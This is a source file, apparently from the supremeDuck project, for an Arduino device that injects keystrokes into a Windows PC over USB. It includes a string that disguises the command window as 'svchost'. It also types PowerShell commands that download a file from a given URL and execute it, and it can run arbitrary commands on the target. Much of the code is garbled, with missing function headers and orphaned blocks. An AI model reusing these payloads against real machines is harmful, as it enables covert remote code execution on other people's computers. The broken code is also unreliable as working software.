
/*
supremeDuck project - https://github.com/michalmonday/supremeDuck
Created by Michal Borowski
*/


/* 
 *
 *  
 *  
 *  
 *  
 *  
 *  
 *  
 * 
 * 
 */



#define LOG_SAVED_ENCODING_EEPROM false


/*
#define EEPROM_ADDRESS_TRIGGER_TRICK 0
trick = plug it in + plug out within 3 secs => special function is triggered(that special function is commented out in "setup" funciton)
*/





#define ENCODING_BYTE_DESIRED 0
#define ENCODING_BYTE_USED 1
#define ENCODING_BYTE_MODIFIER 2
#define ENCODING_SIZE 72

  {0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x4D, 0x51, 0x57, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x69, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E},
  {0x31, 0x22, 0x33, 0x34, 0x35, 0x37, 0x22, 0x39, 0x30, 0x38, 0x3D, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3B, 0x3B, 0x2C, 0x3D, 0x2E, 0x2F, 0x32, 0x61, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x5B, 0x5C, 0x5D, 0x36, 0x2D, 0x7E, 0x61, 0x69, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x5B, 0x5C, 0x5D, 0x7E},
  {0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x00, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x81, 0x81, 0x81}
}; //saved at EEPROM 1-100, 101-200, 201-300

#define EEPROM_STARTING_ADDRESS_ENCODING_DESIRED 1 
#define EEPROM_STARTING_ADDRESS_ENCODING_USED 101
#define EEPROM_STARTING_ADDRESS_ENCODING_MODIFIER 201
#define EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS 301
#define EEPROM_STARTING_ADDRESS_ENCODING_NAME 302

/*
 * keypad values copied from http://forum.arduino.cc/index.php?topic=266688.msg1880647#msg1880647
 * thanks to nickgammon's reply
 */

byte KEYPAD[10] = {
  234,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233
};

unsigned long lastOKsendingTime = 0;

char commandLineObfuscationString[54] = "echo off & mode 20,1 & title svchost & color 78 & cls"; // line used to make the command prompt less visible

// setup function is a part of every Arduino sketch, it gets called once at the begining
void setup()
{


  /*
  //TRIGGER TRICK
  //plug in and out within 3 sec to trigger some action at the next plug in
  byte triggerDefault = 0;
  EEPROM.get(EEPROM_ADDRESS_TRIGGER_TRICK, triggerDefault);
  byte c =1;
  EEPROM.put(EEPROM_ADDRESS_TRIGGER_TRICK, c);
  if(triggerDefault == 1)
  {
    //action
  }

  delay(3000);
  c =0;
  EEPROM.put(EEPROM_ADDRESS_TRIGGER_TRICK, c);  
  */  

  //delay(10000);  
}

{ 
  byte i=0; 
  {        
    {      
      lastByteRec = millis();   
      while (BTSerial.available() > 0 && i < MAX_SERIAL_LENGTH-1) 
      {
        {
        }
        previousByteRec = lastByteRec;
      }    
    }

    lastOKsendingTime = millis();
  }
  

  {
    {
      previousSendingTime = lastSendingTime;
      char data[40];
    }
  }
} 

{
  if(LOG_SERIAL)
  { 
    Serial.print(F("MultiLang method (Windows only) setting has been read from the EEPROM - "));
    if(useMultiLangWindowsMethod)
    {
      Serial.println(F("it's enabled."));
    }
    else
    {
      Serial.println(F("it's disabled."));
    }
  }
}

{
  EEPROM.get(EEPROM_ADDRESS_ENCODING_AVAILABLE, numCheck);
  if(numCheck == 777)
  {
    for(byte i=0;i<3; i++)
    {
      for(byte offset=0; offset<ENCODING_SIZE; offset++)
      {
        if(LOG_SAVED_ENCODING_EEPROM)
        {
          Serial.print(Encoding[i][offset], HEX);
          Serial.print(F(","));
        }
      }

      if(LOG_SAVED_ENCODING_EEPROM){Serial.print("\n");}
    }

    EEPROM.get(EEPROM_STARTING_ADDRESS_ENCODING_NAME, encodingName);
  }
  else if(LOG_SAVED_ENCODING_EEPROM)
  {
    Serial.print(F("No encoding available"));
    Serial.print(F("\n"));
  }
}


void MyFuncMouseMove(char *inStr)
{
  char x;
  char y;

  //MM:L,U,FF,FF,end
  char strValBuff[3]={inStr[7],inStr[8],'\0'}; 
  x = (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
   
  strValBuff[0]=inStr[10]; 
  strValBuff[1]=inStr[11]; 
  y = (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
  
 //MM:L,U,FF,FF,end //left/right, up/down, horizontal value, vertical value
  if(inStr[3] == 'L'){x = x * -1;}
  if(inStr[5] == 'D'){y = y * -1;}       

  if(LOG_SERIAL){Serial.print("    x="); Serial.print((byte)x);Serial.print(", y=");Serial.print((byte)y);Serial.print("\n");}
  Mouse.move(x, y, 0);
  
  for(byte i=0;i<strlen(inStr);i++){inStr[i]=0;}
}

void typeKey(int key)
{
  delay(50);
}

void openRun()
{
  delay(200);
  delay(200);
  delay(700);
}

void openCmd()
{
  openRun();  
  Print("cmd");
  typeKey(KEY_RETURN); 
}

void EnterCommand(char *text)
{
  Print(text);
  delay(10);
  typeKey(KEY_RETURN);  
}

void Check_Protocol(char *inStr)
{       
  {    
    typeKey(KEY_RETURN);
  }

  if(!strcmp(inStr,"Alt+F4"))
  {    
    delay(10);
    delay(50);
  }

  if(!strcmp(inStr,"Increase font size"))
  {    
    delay(10);
    delay(10);
    delay(50);
  }

  if(!strcmp(inStr,"Decrease font size"))
  {    
    delay(10);
    delay(10);
    delay(50);
  }

  if(!strcmp(inStr,"Select all"))
  {    
    delay(10);
    delay(50);
  }

  if(!strcmp(inStr,"Bold"))
  {    
    delay(10);
    delay(50);
  }

  if(!strcmp(inStr,"Underline"))
  {    
    delay(10);
    delay(50);
  }

  if(!strcmp(inStr,"click"))
  {    
    Mouse.click();
  }

  {

    char fileFormat[10];
    for(byte i=0;i<=typeLen;i++)
    {
      fileFormat[i] = inStr[i+indexType+strlen(",type:")];
      
      if(i == typeLen){fileFormat[i] = '\0';}
    }
       
    for(byte i=0;i<=indexType-3;i++)//indexType - 3 which is "DE:" + 1
    {
      inStr[i] = inStr[i+3];
      
      if(i == indexType-3){inStr[i] = '\0';}
    }    
      
    openCmd(); //("powershell Start-Process cmd -Verb runAs");
    delay(500);
    EnterCommand(commandLineObfuscationString);
    
    Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
    Print(inStr);
    Print("'; $file = 'downloadedfile.");
    Print(fileFormat);
    Print("'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;\" & exit");
    typeKey(KEY_RETURN);
  }
  

  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    Print("www.youtube.com/embed/");
    Print(inStr);
    Print("?rel=0&autoplay=1");
    typeKey(KEY_RETURN);     
  }

  {
    ExtractDeliveredText(inStr, 4);
    if(StrContains(inStr, "PP")){Print(" ");}//pause/play
    delay (70);
  }

  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    Print(inStr);
    typeKey(KEY_RETURN);     
  }

  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    Print(inStr);
    delay(100);
    typeKey(KEY_RETURN);  
  }

  {
    ExtractDeliveredText(inStr, 3);
    
    openCmd();
    delay(500);
    EnterCommand(commandLineObfuscationString);
    Print(inStr);

    Print(" & exit");
    typeKey(KEY_RETURN);  
    delay(100);
  }

  //.

 
  
  {
    ExtractDeliveredText(inStr, 3);
    Print(inStr);
  }

  {
    ExtractDeliveredText(inStr, 3);
    Print(inStr);
    delay(20);
    delay(20);
  }

  {
    byte encodingFactor=255;
    {
      /*
       * the encoding data is large so the app sends the data in 4 steps, first sends the desired characters, the ones that the user wants to type (marked by the letter "D")
       * then it sends the used characters, the ones that have to be "pressed" in order to type the desired characters while using a specific language settings (these "Used characters" are marked by the letter "U")
       * then it sends the modifier keys, they are used to know whether some shift or alt has to be pressed together with the "Used char" to achieve "Desired char" being typed on the target PC  
       * the last message sent is just a name of the language (e.g. UK - gb)
       * 
       * Let's pretend that I want to type the letter "n" which is 0x6D in ascii table. Let's assume hypothetically that in order to type that letter on a PC with a Japanese keyboard setting
       * I have to press "z" + shift that are respectively 0x7A in ascii table and 0x81 (according to not ascii table but this: https://www.arduino.cc/en/Reference/KeyboardModifiers)
       * The encoding data which will allow me to correctly type letter "c" in such case would be:
       * ENC,D:6D,end
       * ENC,U:7A,end
       * ENC,M:81,end
       * ENC,N:HypotheticalJapanese - hj,end
       * 
       * The above example would send the data required for 1 char, the implementation of this system sends no more than 72 bytes/chars at once.
       */
      case 'D': 
        {
          encodingFactor=0;
        }     
        break;
        
      case 'U':
        {
          encodingFactor=1;  
        }
        break;
      case 'M':
        {
          encodingFactor=2; 
        }
        break;
      case 'N':
        {
          ExtractDeliveredText(inStr, 6);
          sprintf(encodingName, "%s\0", inStr);
          EEPROM.put(EEPROM_STARTING_ADDRESS_ENCODING_NAME, encodingName);
          for(byte i=0;i<MAX_SERIAL_LENGTH;i++){inStr[i]=0;}
          return;
        }
        break;
      default:
        {
          Serial.print(F("Error: Incorrect encoding factor."));
          return;
        }
        break;
    }   

    ExtractDeliveredText(inStr, 6);
    
    if(LOG_SAVED_ENCODING_EEPROM){Serial.print("Received:\n");}

    for(byte offset=0; offset<strlen(inStr); offset+=2)
    {
      byte strValBuff[3]={inStr[offset],inStr[offset+1],'\0'}; 


      if(LOG_SAVED_ENCODING_EEPROM)
      {
        Serial.print(Encoding[encodingFactor][offset/2], HEX);
        Serial.print(F("-"));
        Serial.print(offset);
        Serial.print(F("  "));       
      }
    }  
    
    if(LOG_SAVED_ENCODING_EEPROM){Serial.print(F("\nSaved to EEPROM:\n"));}

    //save to EEPROM
    for(byte offset=0; offset<ENCODING_SIZE; offset++)
    {
      Encoding[encodingFactor][offset] = ((offset<(strlen(inStr)/2)) ? Encoding[encodingFactor][offset] : 0);
      
      if(LOG_SAVED_ENCODING_EEPROM)
      {
        Serial.print(Encoding[encodingFactor][offset], HEX);
        Serial.print(F(","));
      }
    }

    if(LOG_SAVED_ENCODING_EEPROM){Serial.print(F("\n\n"));}
    
  } 

  {

    char fileFormat[10];
    byte typeLen = indexEnd - (indexType + strlen(",type:")); //get length
    for(byte i=0;i<=typeLen;i++)
    {
      fileFormat[i] = inStr[i+indexType+strlen(",type:")];
      
      if(i == typeLen){fileFormat[i] = '\0';}
    }
       
    for(byte i=0;i<=indexType-3;i++)//indexType - 3 which is "SW:" + 1
    {
      inStr[i] = inStr[i+3];
      
      if(i == indexType-3){inStr[i] = '\0';}
    }    
      
    openCmd(); //("powershell Start-Process cmd -Verb runAs");
    delay(500);
    EnterCommand(commandLineObfuscationString);
    
    Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
    Print(inStr);
    Print("'; $file = 'downloadedfile.");
    Print(fileFormat);
    Print("'; $down.DownloadFile($url,$file); exit;\" & reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Users\\%USERNAME%\\downloadedfile.");
    Print(fileFormat);
    Print(" /f & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & exit");
    typeKey(KEY_RETURN);
  }

  {
    ExtractDeliveredText(inStr, 3);
    
    if(!strcmp(inStr,"Enabled"))
    {
      useMultiLangWindowsMethod = true;
      EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, true);
      if(LOG_SERIAL){Serial.println(F("MultiLang method (Windows only) has been enabled."));}
    }
    else if(!strcmp(inStr,"Disabled")) 
    {
      useMultiLangWindowsMethod = false;
      EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, false);
      if(LOG_SERIAL){Serial.println(F("MultiLang method (Windows only) has been disabled."));}
    }
  }



  //ducky script
  //*  PDK_HC:FF,a,end    // Press double key _ hex + char
  //*  PDK_HH:FF,FF,end   // Press double key _ hex + hex
  //*  PK:a,end  // Press key char
  //*  PKH:FF,end // Press key hex
  //*  WAIT:5000,end // delay(5000);
  if(StrStartsWith(inStr,"PDK_HC:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 7);
    inStr[4] = 0;
    
    delay(5);
    //Print(inStr[3]);
    delay(5);
  }

  if(StrStartsWith(inStr,"PDK_HH:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 7);
    char key_1 = HexToChar(inStr);
    char key_2[2] = {HexToChar(inStr+2),"/0"}; 
    delay(5);
    //Print(key_2);
    delay(5);
  }

  if(StrStartsWith(inStr,"PK:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 3);
    inStr[1] = 0;
    Print(inStr[0]);
  }

  if(StrStartsWith(inStr,"PKH:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 4);
    char key[2] = {HexToChar(inStr), '\0'};
    Print(key);
  }

  if(StrStartsWith(inStr,"WAIT:") && StrEndsWith(inStr, ",end"))
  {
    ExtractDeliveredText(inStr, 5);
    int val;
    sscanf(inStr, "%i", &val);
    delay(val);
  }

  {
    char data[13];
  }


  
  for(byte i=0;i<MAX_SERIAL_LENGTH;i++){inStr[i]=0;}
}

/*
ENC,D:2122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F40414D5157595A5B5C5D5E5F6061696D7177797A7B7C7D7E,end
ENC,U:317E333435373238392D345C3D2F37303132333435363738392F5C2C302E2D71616D7177797A382D39333D5C61226D7177797A375C305D,end
ENC,M:81008686818181818100810000008100000000000000000000818181818181868181818181818686868181860000000000000086818686,end
ENC,N:UK - gb,end
*/

{
  byte len = SubStrIndex(inStr, ",end") - ignoredStartingChars;      
   
  for(byte i=0;i<=len;i++)
  {
    inStr[i] = inStr[i+ignoredStartingChars];
    if(i == len)
    {
      inStr[i] = '\0';
    }
  }
}

int SubStrIndex(char *str, char *sfind)
{
    byte found = 0;
    byte index = 0;
    byte len = strlen(str);
   
    if (strlen(sfind) > len) 
    {
        return 0;
    }
    
    while (index < len) 
    {                
        if (str[index] == sfind[found]) 
        {
            found++;
            if (strlen(sfind) == found) 
            {
                index = index - strlen(sfind) + 1;               
                return index;
            }
        }
        else{found = 0;}   
           
        index++;
    }

    return 0;
}

bool StrContains(char *str, char *sfind)
{
    byte found = 0;
    byte index = 0;
    byte len;

    len = strlen(str);
    
    if (strlen(sfind) > len) {return false;}
    
    while (index < len) 
    {
        if (str[index] == sfind[found]) 
        {
            found++;
            if (strlen(sfind) == found) {return true;}
        }
        else {found = 0;}
        
        index++;
    }
    return false;
}

bool StrStartsWith(char* str, char* desiredStart)
{
  if(strlen(desiredStart)>strlen(str)){return false;}
  
  byte matching = 0;
  for(byte i=0; i < strlen(desiredStart); i++)  
    if(str[i] == desiredStart[i])    
      matching++;
      
  if(matching == strlen(desiredStart))  
    return true;
  
  return false;
}

bool StrEndsWith(char* str, char* desiredEnd)
{
  if(strlen(desiredEnd)>strlen(str))
  {
    return false;
  }
  byte matching = 0;
  byte desiredEndLen = strlen(desiredEnd);
  byte baseStrLen = strlen(str);
  for(byte i=0;i<strlen(desiredEnd);i++)
  {
    if(str[baseStrLen - desiredEndLen + i] == desiredEnd[i]){matching++;}
  }
  
  if(matching == desiredEndLen){return true;}
  
  return false;
}



void Print(char *inStr)
{
  //Print_WinMultiLangCHAR_PTR(inStr);
  //return;
   
  int enc_index; 
  {  
    //if(IsCharSpecial(inStr[i]))
    {
      //Serial.print("special char = ");
      //Serial.println(inStr[i]);
      
      byte hundreds = (byte)inStr[i] / 100;
      byte dozens = ((byte)inStr[i] - (hundreds*100)) / 10;
      byte singles = (byte)inStr[i] - (hundreds*100) - (dozens*10);

      /*
      Serial.print(hundreds);
      Serial.print(dozens);
      Serial.println(singles);
      */
    
      PressRelease((char)KEYPAD[hundreds], 5);
      PressRelease((char)KEYPAD[dozens], 5);
      PressRelease((char)KEYPAD[singles], 5);
      continue;
    }
  
    
    enc_index = GetKeyIndex(inStr[i], Encoding[ENCODING_BYTE_DESIRED]);
    {    
      if(Encoding[ENCODING_BYTE_MODIFIER][enc_index] > 0)
      {
        delay(5);
      }

      delay(5);     

      /*
      Serial.print(inStr[i]);
      Serial.print(", ");
      Serial.print(Desired_Keys[enc_index]);
      Serial.print(", ");
      Serial.print(Modifier_Keys[enc_index]);
      Serial.print(", ");
      Serial.print(Used_Keys[enc_index]);
      Serial.print(", ");
      Serial.print("\n");
      */
      
    }
    else // if the standard/normal key can be pressed
    {
      //Serial.print(", ");
      //Serial.println(inStr[i]);
      delay(5);     
    }
  }
}

{
  for(byte i=0;i<strlen(char_array);i++)
  {
    if(c == char_array[i])
    {
      return i;
    }
  }
  return 256;
}


/*
void Print_WinMultiLangCHAR_PTR(char *inStr)
{
  for(byte i=0; i<strlen(inStr); i++)//for each character in the string
  {
    byte hundreds = (byte)inStr[i] / 100;
    byte dozens = ((byte)inStr[i] - (hundreds*100)) / 10;
    byte singles = (byte)inStr[i] - (hundreds*100) - (dozens*10);

    PressRelease((char)KEYPAD[hundreds], 5);
    PressRelease((char)KEYPAD[dozens], 5);
    PressRelease((char)KEYPAD[singles], 5);
  }
}

void Print_WinMultiLangSTR(String inStr)
{
  for(byte i=0; i<inStr.length(); i++)//for each character in the string
  {
    byte hundreds = (byte)inStr.charAt(i) / 100;
    byte dozens = ((byte)inStr.charAt(i) - (hundreds*100)) / 10;
    byte singles = (byte)inStr.charAt(i) - (hundreds*100) - (dozens*10);

    PressRelease((char)KEYPAD[hundreds], 5);
    PressRelease((char)KEYPAD[dozens], 5);
    PressRelease((char)KEYPAD[singles], 5);
  }
}

*/

void PressRelease(char c, byte timeDelay)
{
  delay(timeDelay);
}


/*
Exceptions are the letters that require different button being pressed in different lang settings 
(so if letter == exception then use alt+numpad method, otherwise use the normal typing because it's faster to press 1 instead of 4 buttons) 
these exceptions are listed to make the typing process faster because using alt+numpad method for all the characters appears to be too slow

german - yz
french - qamwz
dutch - qamwz
turkish - i
azerbaijani - totally uncompatible
*/

char exceptions[EXCEPTIONS_SIZE] = {
  'y','Y',
  'z','Z',
  'q','Q',
  'a','A',
  'm','M',
  'w','W',
  'i','I',
};

/*
bool IsCharSpecial(char c)
{
  byte b = (byte)c;
  if((b == 32 || (b >= 49 && b <= 57) || (b >= 65 && b <= 90) || (b >= 97 && b <= 122)) && IsntException(b))
  {
    return false;
  }
  return true;
}
*/

{
  for(byte i=0; i<EXCEPTIONS_SIZE; i++)
  {
    if(c == exceptions[i])
    {
      return true;
    }
  }
  return false;
}


{
  byte b = (byte)c;
  if((b >= 128 && b <=135) || (b >= 176 && b <=179) || (b >= 193 && b <=205) || (b >= 209 && b <=218))
  {
    if(LOG_SERIAL){Serial.println("Is modifier");}
    return true;
  }
  return false;
}

{
  char strValBuff[3]={inStr[0],inStr[1],'\0'}; 
  return (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
}








